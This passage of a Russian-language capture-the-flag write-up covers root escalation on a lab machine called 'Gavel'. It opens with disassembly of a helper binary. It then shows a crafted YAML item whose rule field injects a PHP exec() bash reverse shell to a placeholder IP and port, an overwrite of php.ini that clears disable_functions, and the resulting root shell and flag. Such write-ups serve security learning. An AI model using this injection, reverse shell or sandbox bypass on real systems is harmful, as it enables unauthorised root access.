    1b27:	bf 01 00 00 00       	mov    edi,0x1
    1b2c:	e8 7f f8 ff ff       	call   13b0 <exit@plt>
    1b31:	66 66 2e 0f 1f 84 00 	data16 cs nop WORD PTR [rax+rax*1+0x0]
    1b38:	00 00 00 00 
    1b3c:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]

0000000000001b40 <collect_env>:
    1b40:	41 57                	push   r15
    1b42:	41 56                	push   r14
    1b44:	41 55                	push   r13
    1b46:	41 54                	push   r12
    1b48:	55                   	push   rbp
    1b49:	53                   	push   rbx
    1b4a:	48 81 ec 18 01 00 00 	sub    rsp,0x118
    1b51:	64 48 8b 04 25 28 00 	mov    rax,QWORD PTR fs:0x28
    1b58:	00 00 
    1b5a:	48 89 84 24 08 01 00 	mov    QWORD PTR [rsp+0x108],rax
    1b61:	00 
    1b62:	31 c0                	xor    eax,eax
    1b64:	e8 87 f8 ff ff       	call   13f0 <json_object_new_object@plt>
    1b69:	4c 8b 35 b0 24 00 00 	mov    r14,QWORD PTR [rip+0x24b0]        # 4020 <__environ@GLIBC_2.2.5>
    1b70:	49 89 c5             	mov    r13,rax
    1b73:	49 8b 2e             	mov    rbp,QWORD PTR [r14]
    1b76:	48 85 ed             	test   rbp,rbp
    1b79:	74 65                	je     1be0 <collect_env+0xa0>
    1b7b:	49 89 e4             	mov    r12,rsp
    1b7e:	66 90                	xchg   ax,ax
    1b80:	be 3d 00 00 00       	mov    esi,0x3d
    1b85:	48 89 ef             	mov    rdi,rbp
    1b88:	e8 53 f7 ff ff       	call   12e0 <strchr@plt>
    1b8d:	48 89 c3             	mov    rbx,rax
    1b90:	48 85 c0             	test   rax,rax
    1b93:	74 3e                	je     1bd3 <collect_env+0x93>
    1b95:	49 89 c7             	mov    r15,rax
    1b98:	49 29 ef             	sub    r15,rbp
    1b9b:	49 81 ff ff 00 00 00 	cmp    r15,0xff
    1ba2:	77 2f                	ja     1bd3 <collect_env+0x93>
    1ba4:	4c 89 fa             	mov    rdx,r15
    1ba7:	48 89 ee             	mov    rsi,rbp
    1baa:	b9 00 01 00 00       	mov    ecx,0x100
    1baf:	4c 89 e7             	mov    rdi,r12
    1bb2:	e8 89 f7 ff ff       	call   1340 <__memcpy_chk@plt>
    1bb7:	48 8d 7b 01          	lea    rdi,[rbx+0x1]
    1bbb:	42 c6 04 3c 00       	mov    BYTE PTR [rsp+r15*1],0x0
    1bc0:	e8 6b f6 ff ff       	call   1230 <json_object_new_string@plt>
    1bc5:	4c 89 e6             	mov    rsi,r12
    1bc8:	4c 89 ef             	mov    rdi,r13
    1bcb:	48 89 c2             	mov    rdx,rax
    1bce:	e8 1d f7 ff ff       	call   12f0 <json_object_object_add@plt>
    1bd3:	49 8b 6e 08          	mov    rbp,QWORD PTR [r14+0x8]
    1bd7:	49 83 c6 08          	add    r14,0x8
    1bdb:	48 85 ed             	test   rbp,rbp
    1bde:	75 a0                	jne    1b80 <collect_env+0x40>
    1be0:	48 8b 84 24 08 01 00 	mov    rax,QWORD PTR [rsp+0x108]
    1be7:	00 
    1be8:	64 48 2b 04 25 28 00 	sub    rax,QWORD PTR fs:0x28
    1bef:	00 00 
    1bf1:	75 15                	jne    1c08 <collect_env+0xc8>
    1bf3:	48 81 c4 18 01 00 00 	add    rsp,0x118
    1bfa:	4c 89 e8             	mov    rax,r13
    1bfd:	5b                   	pop    rbx
    1bfe:	5d                   	pop    rbp
    1bff:	41 5c                	pop    r12
    1c01:	41 5d                	pop    r13
    1c03:	41 5e                	pop    r14
    1c05:	41 5f                	pop    r15
    1c07:	c3                   	ret
    1c08:	e8 c3 f6 ff ff       	call   12d0 <__stack_chk_fail@plt>
    1c0d:	0f 1f 00             	nop    DWORD PTR [rax]

0000000000001c10 <writen>:
    1c10:	41 55                	push   r13
    1c12:	49 89 d5             	mov    r13,rdx
    1c15:	41 54                	push   r12
    1c17:	55                   	push   rbp
    1c18:	53                   	push   rbx
    1c19:	48 83 ec 08          	sub    rsp,0x8
    1c1d:	48 85 d2             	test   rdx,rdx
    1c20:	74 29                	je     1c4b <writen+0x3b>
    1c22:	41 89 fc             	mov    r12d,edi
    1c25:	48 89 f5             	mov    rbp,rsi
    1c28:	48 89 d3             	mov    rbx,rdx
    1c2b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]
    1c30:	48 89 da             	mov    rdx,rbx
    1c33:	48 89 ee             	mov    rsi,rbp
    1c36:	44 89 e7             	mov    edi,r12d
    1c39:	e8 62 f6 ff ff       	call   12a0 <write@plt>
    1c3e:	48 85 c0             	test   rax,rax
    1c41:	7e 1d                	jle    1c60 <writen+0x50>
    1c43:	48 01 c5             	add    rbp,rax
    1c46:	48 29 c3             	sub    rbx,rax
    1c49:	75 e5                	jne    1c30 <writen+0x20>
    1c4b:	4c 89 e8             	mov    rax,r13
    1c4e:	48 83 c4 08          	add    rsp,0x8
    1c52:	5b                   	pop    rbx
    1c53:	5d                   	pop    rbp
    1c54:	41 5c                	pop    r12
    1c56:	41 5d                	pop    r13
    1c58:	c3                   	ret
    1c59:	0f 1f 80 00 00 00 00 	nop    DWORD PTR [rax+0x0]
    1c60:	e8 fb f5 ff ff       	call   1260 <__errno_location@plt>
    1c65:	83 38 04             	cmp    DWORD PTR [rax],0x4
    1c68:	74 c6                	je     1c30 <writen+0x20>
    1c6a:	48 83 c8 ff          	or     rax,0xffffffffffffffff
    1c6e:	eb de                	jmp    1c4e <writen+0x3e>

0000000000001c70 <send_header_and_content>:
    1c70:	41 56                	push   r14
    1c72:	41 55                	push   r13
    1c74:	49 89 d5             	mov    r13,rdx
    1c77:	41 54                	push   r12
    1c79:	41 89 cc             	mov    r12d,ecx
    1c7c:	55                   	push   rbp
    1c7d:	89 fd                	mov    ebp,edi
    1c7f:	48 89 f7             	mov    rdi,rsi
    1c82:	31 f6                	xor    esi,esi
    1c84:	53                   	push   rbx
    1c85:	48 83 ec 10          	sub    rsp,0x10
    1c89:	64 48 8b 04 25 28 00 	mov    rax,QWORD PTR fs:0x28
    1c90:	00 00 
    1c92:	48 89 44 24 08       	mov    QWORD PTR [rsp+0x8],rax
    1c97:	31 c0                	xor    eax,eax
    1c99:	e8 f2 f5 ff ff       	call   1290 <json_object_to_json_string_ext@plt>
    1c9e:	48 89 c7             	mov    rdi,rax
    1ca1:	49 89 c6             	mov    r14,rax
    1ca4:	e8 17 f6 ff ff       	call   12c0 <strlen@plt>
    1ca9:	48 8d 74 24 04       	lea    rsi,[rsp+0x4]
    1cae:	ba 04 00 00 00       	mov    edx,0x4
    1cb3:	89 ef                	mov    edi,ebp
    1cb5:	48 89 c3             	mov    rbx,rax
    1cb8:	0f c8                	bswap  eax
    1cba:	89 44 24 04          	mov    DWORD PTR [rsp+0x4],eax
    1cbe:	e8 4d ff ff ff       	call   1c10 <writen>
    1cc3:	48 83 f8 04          	cmp    rax,0x4
    1cc7:	75 64                	jne    1d2d <send_header_and_content+0xbd>
    1cc9:	89 db                	mov    ebx,ebx
    1ccb:	4c 89 f6             	mov    rsi,r14
    1cce:	89 ef                	mov    edi,ebp
    1cd0:	48 89 da             	mov    rdx,rbx
    1cd3:	e8 38 ff ff ff       	call   1c10 <writen>
    1cd8:	48 39 d8             	cmp    rax,rbx
    1cdb:	75 42                	jne    1d1f <send_header_and_content+0xaf>
    1cdd:	45 85 e4             	test   r12d,r12d
    1ce0:	75 1d                	jne    1cff <send_header_and_content+0x8f>
    1ce2:	48 8b 44 24 08       	mov    rax,QWORD PTR [rsp+0x8]
    1ce7:	64 48 2b 04 25 28 00 	sub    rax,QWORD PTR fs:0x28
    1cee:	00 00 
    1cf0:	75 49                	jne    1d3b <send_header_and_content+0xcb>
    1cf2:	48 83 c4 10          	add    rsp,0x10
    1cf6:	5b                   	pop    rbx
    1cf7:	5d                   	pop    rbp
    1cf8:	41 5c                	pop    r12
    1cfa:	41 5d                	pop    r13
    1cfc:	41 5e                	pop    r14
    1cfe:	c3                   	ret
    1cff:	4c 89 e2             	mov    rdx,r12
    1d02:	4c 89 ee             	mov    rsi,r13
    1d05:	89 ef                	mov    edi,ebp
    1d07:	e8 04 ff ff ff       	call   1c10 <writen>
    1d0c:	4c 39 e0             	cmp    rax,r12
    1d0f:	74 d1                	je     1ce2 <send_header_and_content+0x72>
    1d11:	48 8d 3d 23 03 00 00 	lea    rdi,[rip+0x323]        # 203b <_IO_stdin_used+0x3b>
    1d18:	31 c0                	xor    eax,eax
    1d1a:	e8 21 fd ff ff       	call   1a40 <die>
    1d1f:	48 8d 3d 04 03 00 00 	lea    rdi,[rip+0x304]        # 202a <_IO_stdin_used+0x2a>
    1d26:	31 c0                	xor    eax,eax
    1d28:	e8 13 fd ff ff       	call   1a40 <die>
    1d2d:	48 8d 3d e2 02 00 00 	lea    rdi,[rip+0x2e2]        # 2016 <_IO_stdin_used+0x16>
    1d34:	31 c0                	xor    eax,eax
    1d36:	e8 05 fd ff ff       	call   1a40 <die>
    1d3b:	e8 90 f5 ff ff       	call   12d0 <__stack_chk_fail@plt>

0000000000001d40 <readn>:
    1d40:	41 55                	push   r13
    1d42:	49 89 d5             	mov    r13,rdx
    1d45:	41 54                	push   r12
    1d47:	41 89 fc             	mov    r12d,edi
    1d4a:	55                   	push   rbp
    1d4b:	48 89 f5             	mov    rbp,rsi
    1d4e:	53                   	push   rbx
    1d4f:	48 89 d3             	mov    rbx,rdx
    1d52:	48 83 ec 08          	sub    rsp,0x8
    1d56:	66 2e 0f 1f 84 00 00 	cs nop WORD PTR [rax+rax*1+0x0]
    1d5d:	00 00 00 
    1d60:	48 89 da             	mov    rdx,rbx
    1d63:	48 89 ee             	mov    rsi,rbp
    1d66:	44 89 e7             	mov    edi,r12d
    1d69:	e8 a2 f5 ff ff       	call   1310 <read@plt>
    1d6e:	48 85 c0             	test   rax,rax
    1d71:	78 1d                	js     1d90 <readn+0x50>
    1d73:	74 0b                	je     1d80 <readn+0x40>
    1d75:	48 01 c5             	add    rbp,rax
    1d78:	48 29 c3             	sub    rbx,rax
    1d7b:	75 e3                	jne    1d60 <readn+0x20>
    1d7d:	4c 89 e8             	mov    rax,r13
    1d80:	48 83 c4 08          	add    rsp,0x8
    1d84:	5b                   	pop    rbx
    1d85:	5d                   	pop    rbp
    1d86:	41 5c                	pop    r12
    1d88:	41 5d                	pop    r13
    1d8a:	c3                   	ret
    1d8b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]
    1d90:	e8 cb f4 ff ff       	call   1260 <__errno_location@plt>
    1d95:	83 38 04             	cmp    DWORD PTR [rax],0x4
    1d98:	74 c6                	je     1d60 <readn+0x20>
    1d9a:	48 83 c8 ff          	or     rax,0xffffffffffffffff
    1d9e:	eb e0                	jmp    1d80 <readn+0x40>

0000000000001da0 <recv_response>:
    1da0:	41 54                	push   r12
    1da2:	ba 04 00 00 00       	mov    edx,0x4
    1da7:	55                   	push   rbp
    1da8:	89 fd                	mov    ebp,edi
    1daa:	53                   	push   rbx
    1dab:	48 83 ec 10          	sub    rsp,0x10
    1daf:	64 48 8b 04 25 28 00 	mov    rax,QWORD PTR fs:0x28
    1db6:	00 00 
    1db8:	48 89 44 24 08       	mov    QWORD PTR [rsp+0x8],rax
    1dbd:	31 c0                	xor    eax,eax
    1dbf:	48 8d 74 24 04       	lea    rsi,[rsp+0x4]
    1dc4:	e8 77 ff ff ff       	call   1d40 <readn>
    1dc9:	48 83 f8 04          	cmp    rax,0x4
    1dcd:	75 7e                	jne    1e4d <recv_response+0xad>
    1dcf:	8b 5c 24 04          	mov    ebx,DWORD PTR [rsp+0x4]
    1dd3:	0f cb                	bswap  ebx
    1dd5:	85 db                	test   ebx,ebx
    1dd7:	74 45                	je     1e1e <recv_response+0x7e>
    1dd9:	8d 7b 01             	lea    edi,[rbx+0x1]
    1ddc:	e8 7f f5 ff ff       	call   1360 <malloc@plt>
    1de1:	49 89 c4             	mov    r12,rax
    1de4:	48 85 c0             	test   rax,rax
    1de7:	74 64                	je     1e4d <recv_response+0xad>
    1de9:	89 db                	mov    ebx,ebx
    1deb:	48 89 c6             	mov    rsi,rax
    1dee:	89 ef                	mov    edi,ebp
    1df0:	48 89 da             	mov    rdx,rbx
    1df3:	e8 48 ff ff ff       	call   1d40 <readn>
    1df8:	48 39 d8             	cmp    rax,rbx
    1dfb:	75 48                	jne    1e45 <recv_response+0xa5>
    1dfd:	41 c6 04 04 00       	mov    BYTE PTR [r12+rax*1],0x0
    1e02:	48 8b 44 24 08       	mov    rax,QWORD PTR [rsp+0x8]
    1e07:	64 48 2b 04 25 28 00 	sub    rax,QWORD PTR fs:0x28
    1e0e:	00 00 
    1e10:	75 40                	jne    1e52 <recv_response+0xb2>
    1e12:	48 83 c4 10          	add    rsp,0x10
    1e16:	4c 89 e0             	mov    rax,r12
    1e19:	5b                   	pop    rbx
    1e1a:	5d                   	pop    rbp
    1e1b:	41 5c                	pop    r12
    1e1d:	c3                   	ret
    1e1e:	48 8b 44 24 08       	mov    rax,QWORD PTR [rsp+0x8]
    1e23:	64 48 2b 04 25 28 00 	sub    rax,QWORD PTR fs:0x28
    1e2a:	00 00 
    1e2c:	75 24                	jne    1e52 <recv_response+0xb2>
    1e2e:	48 83 c4 10          	add    rsp,0x10
    1e32:	be 01 00 00 00       	mov    esi,0x1
    1e37:	bf 01 00 00 00       	mov    edi,0x1
    1e3c:	5b                   	pop    rbx
    1e3d:	5d                   	pop    rbp
    1e3e:	41 5c                	pop    r12
    1e40:	e9 db f4 ff ff       	jmp    1320 <calloc@plt>
    1e45:	4c 89 e7             	mov    rdi,r12
    1e48:	e8 f3 f3 ff ff       	call   1240 <free@plt>
    1e4d:	45 31 e4             	xor    r12d,r12d
    1e50:	eb b0                	jmp    1e02 <recv_response+0x62>
    1e52:	e8 79 f4 ff ff       	call   12d0 <__stack_chk_fail@plt>
    1e57:	66 0f 1f 84 00 00 00 	nop    WORD PTR [rax+rax*1+0x0]
    1e5e:	00 00 

0000000000001e60 <connect_sock>:
    1e60:	41 54                	push   r12
    1e62:	31 d2                	xor    edx,edx
    1e64:	be 01 00 00 00       	mov    esi,0x1
    1e69:	bf 01 00 00 00       	mov    edi,0x1
    1e6e:	48 83 c4 80          	add    rsp,0xffffffffffffff80
    1e72:	64 48 8b 04 25 28 00 	mov    rax,QWORD PTR fs:0x28
    1e79:	00 00 
    1e7b:	48 89 44 24 78       	mov    QWORD PTR [rsp+0x78],rax
    1e80:	31 c0                	xor    eax,eax
    1e82:	e8 89 f5 ff ff       	call   1410 <socket@plt>
    1e87:	85 c0                	test   eax,eax
    1e89:	0f 88 8b 00 00 00    	js     1f1a <connect_sock+0xba>
    1e8f:	66 0f 6f 05 c9 03 00 	movdqa xmm0,XMMWORD PTR [rip+0x3c9]        # 2260 <_IO_stdin_used+0x260>
    1e96:	00 
    1e97:	31 d2                	xor    edx,edx
    1e99:	41 89 c4             	mov    r12d,eax
    1e9c:	48 89 e6             	mov    rsi,rsp
    1e9f:	66 89 54 24 6a       	mov    WORD PTR [rsp+0x6a],dx
    1ea4:	b8 01 00 00 00       	mov    eax,0x1
    1ea9:	ba 6e 00 00 00       	mov    edx,0x6e
    1eae:	44 89 e7             	mov    edi,r12d
    1eb1:	0f 11 44 24 02       	movups XMMWORD PTR [rsp+0x2],xmm0
    1eb6:	66 0f ef c0          	pxor   xmm0,xmm0
    1eba:	c6 44 24 6d 00       	mov    BYTE PTR [rsp+0x6d],0x0
    1ebf:	66 89 04 24          	mov    WORD PTR [rsp],ax
    1ec3:	48 c7 44 24 12 73 6f 	mov    QWORD PTR [rsp+0x12],0x6b636f73
    1eca:	63 6b 
    1ecc:	48 c7 44 24 1a 00 00 	mov    QWORD PTR [rsp+0x1a],0x0
    1ed3:	00 00 
    1ed5:	48 c7 44 24 62 00 00 	mov    QWORD PTR [rsp+0x62],0x0
    1edc:	00 00 
    1ede:	c6 44 24 6c 00       	mov    BYTE PTR [rsp+0x6c],0x0
    1ee3:	0f 11 44 24 22       	movups XMMWORD PTR [rsp+0x22],xmm0
    1ee8:	0f 11 44 24 32       	movups XMMWORD PTR [rsp+0x32],xmm0
    1eed:	0f 11 44 24 42       	movups XMMWORD PTR [rsp+0x42],xmm0
    1ef2:	0f 11 44 24 52       	movups XMMWORD PTR [rsp+0x52],xmm0
    1ef7:	e8 c4 f4 ff ff       	call   13c0 <connect@plt>
    1efc:	85 c0                	test   eax,eax
    1efe:	78 20                	js     1f20 <connect_sock+0xc0>
    1f00:	48 8b 44 24 78       	mov    rax,QWORD PTR [rsp+0x78]
    1f05:	64 48 2b 04 25 28 00 	sub    rax,QWORD PTR fs:0x28
    1f0c:	00 00 
    1f0e:	75 1e                	jne    1f2e <connect_sock+0xce>
    1f10:	48 83 ec 80          	sub    rsp,0xffffffffffffff80
    1f14:	44 89 e0             	mov    eax,r12d
    1f17:	41 5c                	pop    r12
    1f19:	c3                   	ret
    1f1a:	41 83 cc ff          	or     r12d,0xffffffff
    1f1e:	eb e0                	jmp    1f00 <connect_sock+0xa0>
    1f20:	44 89 e7             	mov    edi,r12d
    1f23:	41 83 cc ff          	or     r12d,0xffffffff
    1f27:	e8 d4 f3 ff ff       	call   1300 <close@plt>
    1f2c:	eb d2                	jmp    1f00 <connect_sock+0xa0>
    1f2e:	e8 9d f3 ff ff       	call   12d0 <__stack_chk_fail@plt>

Disassembly of section .fini:

0000000000001f34 <_fini>:
    1f34:	f3 0f 1e fa          	endbr64
    1f38:	48 83 ec 08          	sub    rsp,0x8
    1f3c:	48 83 c4 08          	add    rsp,0x8
    1f40:	c3                   	ret

```
по факту это парсер который обращается к демону для добавления товаров в аукцион, но у предмета есть та же строчка rule поэтому по факту мы можем использовать ее чтобы вызвать шел но уже от рута, формат файла который необходим есть по пути `/opt/gavel/sample.yaml`
```
auctioneer@gavel:/opt/gavel$ cat sample.yaml 
---
item:
  name: "Dragon's Feathered Hat"
  description: "A flamboyant hat rumored to make dragons jealous."
  image: "https://example.com/dragon_hat.png"
  price: 10000
  rule_msg: "Your bid must be at least 20% higher than the previous bid and sado isn't allowed to buy this item."
  rule: "return ($current_bid >= $previous_bid * 1.2) && ($bidder != 'sado');"
```
попробуем создать файл с содержимым
```
name: "test"
description: "test"
image: "test.jpg"
price: 0
rule_msg: "test"
rule: exec("bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'"); return true;
```
#### Перезапись php.ini

но нам мешает выполнится то что функция включена в список запрещенных, 
```
auctioneer@gavel:/opt/gavel$ /usr/local/bin/gavel-util submit /tmp/rootme.yaml
Illegal rule or sandbox violation.
Warning: exec() has been disabled for security reasons in Command line code on line 1                                                                                      
ILLEGAL_RULE  
```
по факту мы можем перезаписать файл php.ini для нашего gavel, и ф файле нет функции перезаписи тогда
```
auctioneer@gavel:/opt/gavel$ cat /opt/gavel/.config/php/php.ini 
engine=On
display_errors=On
display_startup_errors=On
log_errors=Off
error_reporting=E_ALL
open_basedir=/opt/gavel
memory_limit=32M
max_execution_time=3
max_input_time=10
disable_functions=exec,shell_exec,system,passthru,popen,proc_open,proc_close,pcntl_exec,pcntl_fork,dl,ini_set,eval,assert,create_function,preg_replace,unserialize,extract,file_get_contents,fopen,include,require,require_once,include_once,fsockopen,pfsockopen,stream_socket_client
scan_dir=
allow_url_fopen=Off
allow_url_include=Off
```
по факту нужно убрать содержимое `disable_function` используем новый файл 
```
"engine=On\ndisplay_errors=On\ndisplay_startup_errors=On\nlog_errors=Off\nerror_reporting=E_ALL\nopen_basedir=/opt/gavel\nmemory_limit=32M\nmax_execution_time=\nmax_input_time=\ndisable_functions=\nscan_dir=\nallow_url_fopen=Off\nallow_url_include=Off\n"
```
после этого исполняем наш файл и получаем рут шелл
```
root@gavel:/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@gavel:/# cat /root/root.txt
cat /root/root.txt
3f277da27122afd8515ffaae8c25f5e3
```
